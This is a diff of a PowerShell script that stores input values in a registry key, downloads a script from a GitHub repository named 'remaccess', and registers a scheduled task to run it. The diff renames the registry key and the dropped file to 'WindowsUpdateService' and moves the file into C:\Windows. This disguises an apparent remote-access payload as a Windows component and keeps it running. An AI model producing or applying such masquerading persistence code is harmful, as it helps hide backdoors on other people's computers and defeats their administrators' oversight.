@@ -2,7 +2,7 @@
 $code = Read-Host "Enter the code"
 $data = Read-Host "Enter the data"
 # Define the registry path
-$regPath = "HKLM:\Software\Defender"
+$regPath = "HKLM:\Software\WindowsUpdateService"
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
 }
@@ -10,7 +10,7 @@ if (-not (Test-Path $regPath)) {
 Set-ItemProperty -Path $regPath -Name "Code" -Value $code
 Set-ItemProperty -Path $regPath -Name "Data" -Value $data
 $url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
-$outputPath = "C:\Users\Default\accessctrl.ps1"
+$outputPath = "C:\Windows\WindowsUpdateService.ps1"
 # Download the content from the URL and save it to the specified file
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 $xmlContent = @"
@@ -65,7 +65,7 @@ $xmlContent = @"
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>C:/Users/Default/accessctrl.ps1</Arguments>
+      <Arguments>C:/Windows/WindowsUpdateService.ps1</Arguments>
     </Exec>
   </Actions>
 </Task>
